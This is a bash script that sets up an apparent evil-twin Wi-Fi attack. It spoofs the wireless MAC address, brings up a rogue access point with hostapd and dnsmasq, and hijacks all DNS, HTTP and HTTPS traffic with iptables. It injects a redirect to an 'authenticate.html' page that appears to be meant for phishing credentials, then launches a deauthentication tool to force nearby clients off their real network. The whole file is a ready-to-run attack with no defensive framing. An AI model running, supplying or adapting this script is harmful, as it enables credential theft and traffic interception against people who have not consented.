#!/bin/bash

service apache2 start
sleep 1
ifconfig wlan2 down
macchanger -A wlan2
sleep 1 
ifconfig wlan2 up
sleep 1
hostapd -B /etc/hostapd/hostapd.conf
sleep 2
ifconfig br0 up
sleep 2
ifconfig br0 10.1.1.1 netmask 255.255.255.0
sysctl net.ipv4.ip_forward=1
echo "<meta http-equiv="refresh" content=2;URL='http://10.1.1.1/authenticate.html'>">> /var/www/html/index.html
iptables --flush
iptables -t nat --flush
iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:443
iptables -t nat -A POSTROUTING -j MASQUERADE
sleep 2
service dnsmasq start
sleep 4
echo "AP Should Be Up. Time To Deauth"
echo ""
sleep 2
echo "Press CTRL+B then press D to disconnect TMUX Session Once Deauth Is Started"
echo ""
tmux new -s deauth 'cd PwrDeauther &&  bash PwrDeauther.sh'


